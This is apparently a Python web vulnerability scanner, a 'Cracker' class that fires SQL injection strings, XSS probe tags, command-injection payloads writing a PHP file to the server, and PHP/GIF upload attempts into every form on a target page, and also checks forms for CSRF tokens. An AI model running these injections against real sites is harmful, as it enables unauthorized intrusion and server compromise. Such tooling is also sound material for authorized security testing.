import mechanize
from bs4 import BeautifulSoup
from pprint import pprint
from scipy.stats import entropy
import os

class Cracker(object) :
    def __init__(self) :
        self.br = mechanize.Browser() # Create a new browser
        self.br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')] # A fake web browser
        self.target = None  # The target web page, initially none
        self.seps=["|" , "&&", "||", ";"] # Common commandline separators
        self.main_repport=[]        # Everything will be resumed as table of dictionnaries
        self.tag_dict=[("<h1 id='q5s45qd454dq5d48'></h1>", "h1" ,"q5s45qd454dq5d48")]            # Tags to be injected for XSS scan
        self.query_dict=["admin' OR TRUE ; -- -"]          # Queries to be injectd for sqli scan

    def handle_robots(self, value) :
         self.br.set_handle_robots(value)
    
    def handle_redirect(self, value) :
        self.br.set_handle_redirect(value) # Supports redirection

    def use_cookies(self, value): 
        if value :
            cj = mechanize.CookieJar()
            self.br.set_cookiejar(cj)   # Add a cookie jar to support cookies
        else:
            self.br.set_cookiejar(None)

    def reset_cookie(self) :
        cj = mechanize.CookieJar()
        self.br.set_cookiejar(cj)

    def set_target(self, target) :
        self.target = target

    def load_xss_tags(self, path):
        with open(path, "r") as f: 
            lines = f.readlines()

        self.tag_dict = []

        for line in lines :
            line = line.replace(" ","").split(",")
            self.tag_dict.append((line[0], line[1], line[2]))

    def load_queries(self, path) :
        with open(path, "r") as f:
            self.query_dict = f.readlines()

    def get_base_link(self, url) :
        chunks = url.split("/")
        if chunks[0] != "http:" and  chunks[0] != "https:" :
            return chunks[0]
        
        return  chunks[0] + "//" + chunks[2] 
    
    def perform_sqli(self) :
        if self.target == None :
            return "Must specify a target"
        self.main_repport =[]
        self.br.open(self.target)
        nforms = len(self.br.forms())        # How many forms are within the web page?
        pprint(self.query_dict)
        for query in self.query_dict :
            for i in range(nforms):              # Iterate all the forms
                self.br.select_form(nr=i)
                for inp in self.br.form.controls :
                    if inp.type.lower() == "text" or  inp.type.lower() == "password" or  inp.type.lower() == "textarea":   # Inject only in text and password fields
                        self.br.form[inp.name] = query.replace('\n','')    # Test a simple sql injection

                self.br.submit()    # Submit the form
                if not (self.target in self.br.geturl()) :
                    self.main_repport.append({"Target": self.target, "Form number": i, "Vuln" : "SQLI", "Redir": self.br.geturl(), "Injected" : query })
                
                self.reset_cookie()
                self.br.open(self.target)
        return "Scan done"

    def perform_xss(self):
        if self.target == None :    # no target
            return "Must specify a target"
        self.main_repport =[]
        self.br.open(self.target)   # Go to url
        nforms = len(self.br.forms())   # Get the number of forms
        for i in range(nforms):         # Iterate every form
            for tag, ttype, tid in self.tag_dict :      # tags file like (tag, type, id)
                self.br.select_form(nr=i)   # Select the form
                for inp in self.br.form.controls :  # For every item in the form
                    if inp.type.lower() == "text" or inp.type.lower() == "textarea" :   # if it is a text or a password
                        self.br.form[inp.name] = tag    # Put our forged html tag
                    
                self.br.submit()    # Submit the form
                resp=self.br.response().read()  # Get the response
                soup=BeautifulSoup(resp,'lxml') # Parse it into soup object
                found=soup.find(ttype,{"id":tid})  # Find the forged html tag using our very random id
                if found != None :  # If the tag is found
                    self.main_repport.append({"Target": self.target, "Form number": i, "Vuln" : "XSS", "Redir": self.br.geturl(), "Injected" : tag})  # write the result in main_repport
                self.br.open(self.target)   # Reopen the url to test another form

    def perform_csrf(self):
        if self.target == None :
            return "Must specify a target"
        self.main_repport =[]
        self.br.open(self.target)   # Go to url
        nforms = len(self.br.forms())   # Get the number of forms
        for i in range(nforms):         # Iterate every form
            self.br.select_form(nr=i)   # Select the form
            good=False
            for inp in self.br.form.controls :  # For every item in the form
                if inp.type.lower() == "hidden" :
                    token = [ord(c) for c in list(inp.value)]     # Read the value of the field hidden
                    e=entropy(token)
                    if e > 2 :
                        good=True   # So the form contains a good csrf token
                        break
                    
            if not good:
                self.main_repport.append({"Target": self.target, "Form number": i, "Vuln" : "CSRF", "Redir": self.br.geturl(), "Injected" : None})  # write the result in main_repport

    def perform_shell(self) :
        if self.target == None :
            return "Must specify a target"
        self.main_repport =[]

        pprint(self.target)
        self.br.open(self.target)
        for sep in self.seps :
            nforms=len(self.br.forms()) # Get the number of forms
            for i in range(nforms) : 
                self.br.select_form(nr=i)
                for inp in self.br.form.controls :
                    if inp.type.lower() == "text" or inp.type.lower() == "textarea" :
                        self.br.form[inp.name]="dir " + sep + ' echo "<?php echo 147896325 ?>" > randomtext787890619.php'
                
                pprint("Submitting...")
                self.br.submit()
                pprint("Submitted...")
                ltar=self.target.split("/")
                ltar[-1] = "randomtext787890619.php"
                myp="/".join(ltar)
                pprint("My page : "+myp)
                try :
                    self.br.open(myp)
                    resp=self.br.response().read()
                    if resp != None:
                        self.main_repport.append({"Target": self.target, "Form number": i, "Vuln" : "SHELL", "Redir": self.br.geturl(), "Injected" :  sep + ' echo "<?php echo 147896325 ?>" > randomtext787890619.php'})
                except :
                    pass
                
                self.reset_cookie()
                self.br.open(self.target)

    def upload_php(self, up_path) :
        self.br.form.add_file(open(os.path.join(os.path.dirname(os.path.realpath(__file__)),"payload.php")), 'text/plain', "./payload.php")
        self.br.submit()
        
        try :
            pprint("Looking for : " + self.get_base_link(self.target)+'/'+ up_path.replace("\n",'') + '/payload.php')
            self.br.open(self.get_base_link(self.target)+'/'+ up_path.replace("\n",'') + '/payload.php')
            resp = self.br.response().read()
            pprint(resp)
            pprint("-------------")
            if resp == b'payload123456798' :
                success = True
            else :
                success = False
        except :
            success = False

        self.reset_cookie()
        self.br.open(self.target)
        return success
    
    def upload_gif(self, up_path) :     # TO enhance
        pprint("Trying ... " + self.br.geturl())
        self.br.form.add_file(open(os.path.join(os.path.dirname(os.path.realpath(__file__)),"payload.gif")), 'text/plain', "./payload.gif")
        self.br.submit()
        try :
            self.br.open(self.get_base_link(self.target) +'/'+ up_path.replace("\n",'') + '/payload.gif')
            resp = self.br.response().read()
            pprint(resp)
            pprint("-------------")
            if resp == b'payload123456798' :
                success = True
            else :
                success = False
        except :
            success = False

        self.reset_cookie()
        self.br.open(self.target)
        return success

    def perform_upload(self, up_path) :
        if self.target == None :
            return "Must specify a target"
        self.main_repport =[]
        self.br.open(self.target)
        nforms = len(self.br.forms())   # Get the number of forms
        for i in range(nforms):         # Iterate every form
            self.br.select_form(nr=i)   # Select the form
            for inp in self.br.form.controls :  # For every item in the form
                if inp.type.lower() == "file" :
                    if not self.upload_php(up_path) :
                        self.br.select_form(nr=i)   # Reselect the form
                        success = self.upload_gif(up_path)
                        if success :
                            self.main_repport.append({"Target": self.target, "Form number": i, "Vuln" : "UPLOAD", "Redir": self.br.geturl(), "Injected" : "GIF file with payload"})
                    else :
                        self.main_repport.append({"Target": self.target, "Form number": i, "Vuln" : "UPLOAD", "Redir": self.br.geturl(), "Injected" : "PHP file"})
                    break

if __name__ == "__main__":
    c=Cracker()
    c.set_target("http://127.0.0.1:80/projects/")
    c.perform_sqli()